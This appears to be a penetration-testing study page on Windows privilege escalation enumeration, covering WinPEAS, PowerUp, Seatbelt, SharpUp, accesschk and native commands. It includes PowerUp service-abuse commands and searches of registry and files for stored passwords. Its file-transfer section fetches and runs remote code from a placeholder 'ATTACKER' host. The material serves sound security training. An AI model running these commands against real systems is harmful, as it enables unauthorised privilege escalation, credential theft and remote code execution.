---
title: 'Tools & Enumeration'
description: 'Windows privilege escalation enumeration tools — WinPEAS, PowerUp, Seatbelt, SharpUp, accesschk, and native commands with practical usage examples.'
---

# Tools & Enumeration

Automated enumeration tools are your best friend during a time-limited exam. Run them early, review the output, then dig deeper into flagged vectors manually.

---

## 1. Automated Enumeration Tools

### WinPEAS

The gold standard for Windows privilege escalation enumeration. Checks everything from service misconfigs to credential files.

```cmd
:: Run with all checks, output in color
winpeas.exe

:: Redirect output for review
winpeas.exe > winpeas_output.txt

:: Run specific checks only
winpeas.exe servicesinfo
winpeas.exe userinfo
winpeas.exe systeminfo
```

!!! tip "WinPEAS Color Coding"
    - 🔴 **Red/Yellow** = Almost certain privilege escalation vector
    - 🟡 **Yellow** = Possible vector, needs manual verification
    - 🟢 **Green** = Informational, good for context

**Download**: [github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)

---

### PowerUp (PowerShell)

Part of PowerSploit. Focuses on common Windows misconfigurations.

```powershell
# Import and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-UnattendedInstallFile
```

```powershell
# Abuse functions — exploit directly
# Replace a writable service binary
Install-ServiceBinary -Name 'VulnService'

# Abuse a modifiable service
Invoke-ServiceAbuse -Name 'VulnService' -UserName 'attacker' -Password 'Password123!'

# Write a malicious .bat to an unquoted service path
Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\Vuln Service\service.exe'
```

**Download**: [github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

---

### Seatbelt (C#)

Comprehensive .NET-based enumeration tool. Excellent for gathering host details.

```cmd
:: Run all checks
Seatbelt.exe -group=all

:: Specific groups
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc

:: Individual checks
Seatbelt.exe TokenPrivileges
Seatbelt.exe WindowsAutoLogon
Seatbelt.exe ScheduledTasks
Seatbelt.exe Services
```

**Download**: [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

---

### SharpUp (C#)

.NET port of PowerUp's privilege escalation checks. Useful when PowerShell is restricted.

```cmd
:: Run all checks
SharpUp.exe audit

:: Specific checks
SharpUp.exe ModifiableServices
SharpUp.exe UnquotedServicePath
SharpUp.exe ModifiableServiceBinaries
```

**Download**: [github.com/GhostPack/SharpUp](https://github.com/GhostPack/SharpUp)

---

### PrivescCheck (PowerShell)

Modern PowerShell-based enumeration script with detailed output formatting.

```powershell
# Import and run
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# Extended mode with more checks
Invoke-PrivescCheck -Extended

# Export to HTML report
Invoke-PrivescCheck -Extended -Report PrivescCheck_Report -Format HTML
```

**Download**: [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

---

## 2. Sysinternals Tools

### AccessChk (`accesschk.exe`)

Essential for auditing permissions on services, files, and registry keys.

```cmd
:: Accept EULA silently (important for first run)
accesschk.exe /accepteula

:: Check which services "Everyone" or "Users" can modify
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

:: Check writable directories in Program Files
accesschk.exe -uwdqs "Users" "C:\Program Files" /accepteula
accesschk.exe -uwdqs "Users" "C:\Program Files (x86)" /accepteula

:: Check writable files (look for service binaries)
accesschk.exe -uwqs "Users" "C:\Program Files\*.*" /accepteula

:: Check registry key permissions for services
accesschk.exe -kvuqsw "Users" "HKLM\System\CurrentControlSet\Services" /accepteula

:: Check startup programs permissions
accesschk.exe -uwdqs "Users" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

#### AccessChk Permission Flags Reference

| Flag | Meaning | Escalation Relevance |
|:-----|:--------|:--------------------|
| `RW` | Read/Write | Can modify the object |
| `SERVICE_ALL_ACCESS` | Full service control | Can change binpath, start/stop |
| `SERVICE_CHANGE_CONFIG` | Modify service config | Change binpath to malicious binary |
| `SERVICE_START` | Start the service | Needed to trigger after modification |
| `SERVICE_STOP` | Stop the service | Needed to restart with new config |
| `FILE_ALL_ACCESS` | Full file control | Replace service binary |
| `KEY_ALL_ACCESS` | Full registry control | Modify service registry entries |

---

### ProcMon (Process Monitor)

Use ProcMon to discover DLL hijacking opportunities by filtering for missing DLLs.

1. Start ProcMon and set filters:
   - **Operation** is `CreateFile` → then **Include**
   - **Result** is `NAME NOT FOUND` → then **Include**
   - **Path** ends with `.dll` → then **Include**
2. Start/stop target services or applications
3. Look for DLL load attempts from writable directories

---

## 3. Native Windows Enumeration Cheatsheet

### Service Enumeration

```cmd
:: List all services with binary paths (THE most important command)
wmic service get name,displayname,pathname,startmode

:: Find unquoted service paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: PowerShell — find unquoted service paths
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.StartMode -ne 'Disabled'} | Select Name, PathName, StartName

:: Query specific service config
sc qc ServiceName

:: Check service DACL
sc sdshow ServiceName
```

### Registry Enumeration

```cmd
:: AlwaysInstallElevated (both must be 1 for exploit)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"

:: Saved passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: Service ImagePath (manual unquoted path check)
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ImagePath
```

### Credential & File Hunting

```cmd
:: Saved credentials (use with runas /savecred)
cmdkey /list

:: Search for sensitive files
dir /s /b C:\*.txt C:\*.ini C:\*.cfg C:\*.config 2>nul | findstr /i "pass cred vnc .config"

:: Search for unattend files
dir /s /b C:\Unattend.xml C:\sysprep.inf C:\sysprep.xml C:\unattended.xml 2>nul

:: PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: Search file contents for passwords
findstr /si "password" *.txt *.ini *.config *.xml *.cfg
findstr /spin "password" *.*

:: IIS config files
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul
```

---

## 4. File Transfer Methods

Getting tools onto the target is often the first challenge:

```cmd
:: PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/winpeas.exe','C:\temp\winpeas.exe')"

:: PowerShell IEX (in-memory execution)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')"

:: Certutil
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\temp\tool.exe

:: Bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER/tool.exe C:\temp\tool.exe

:: SMB share (from attacker: impacket-smbserver share . -smb2support)
copy \\ATTACKER\share\tool.exe C:\temp\tool.exe

:: Python HTTP server (on attacker)
python3 -m http.server 80
```
